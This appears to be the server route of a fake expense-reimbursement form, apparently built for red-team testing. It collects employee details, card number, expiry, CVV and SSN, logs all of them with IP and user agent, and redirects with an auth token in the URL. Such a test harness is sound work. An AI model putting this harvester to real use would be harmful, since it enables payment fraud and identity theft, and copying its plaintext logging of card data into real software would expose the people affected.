import { NextRequest, NextResponse } from 'next/server';
import { logger } from '../../../utils/lib/logger';
import { generateSessionId, generateAuthToken } from '../../../utils/api';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { 
      employeeName, 
      employeeId, 
      expenseDescription, 
      amount, 
      businessPurpose, 
      clientName, 
      notes,
      cardNumber,
      cardExpiry,
      cardCvv,
      ssn
    } = body;
    
    // Generate mock tokens for red team testing
    const sessionId = generateSessionId(employeeId);
    const authToken = generateAuthToken(employeeName);
    
    // Log the submission with all form data
    await logger({
      type: 'submit',
      timestamp: new Date().toISOString(),
      formData: {
        employeeName,
        employeeId,
        expenseDescription,
        amount,
        businessPurpose,
        clientName,
        notes,
        cardNumber,
        cardExpiry,
        cardCvv,
        ssn
      },
      sessionId,
      authToken,
      userAgent: request.headers.get('user-agent'),
      ip: request.headers.get('x-forwarded-for') || 'unknown'
    });
    
    // Redirect to approve page with extracted data
    const approveUrl = new URL('/approve', request.url);
    approveUrl.searchParams.set('employee', employeeName || 'unknown');
    approveUrl.searchParams.set('id', employeeId || 'unknown');
    approveUrl.searchParams.set('token', authToken);
    
    return NextResponse.redirect(approveUrl);
    
  } catch (error) {
    await logger({
      type: 'submit_error',
      timestamp: new Date().toISOString(),
      error: error instanceof Error ? error.message : 'Unknown error'
    });
    
    return NextResponse.json({ error: 'Submission failed' }, { status: 500 });
  }
}

